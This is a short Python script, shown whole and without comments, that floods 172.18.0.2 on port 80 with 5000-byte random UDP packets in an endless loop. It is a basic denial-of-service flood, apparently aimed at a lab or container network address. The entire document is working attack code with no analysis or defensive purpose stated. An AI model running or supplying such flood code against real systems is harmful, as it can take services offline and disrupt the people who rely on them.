import socket
import os
bytes = os.urandom(5000)
my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
uri = "172.18.0.2"
port = 80
destination = (uri, port)
while True:
    my_socket.sendto(bytes, destination)

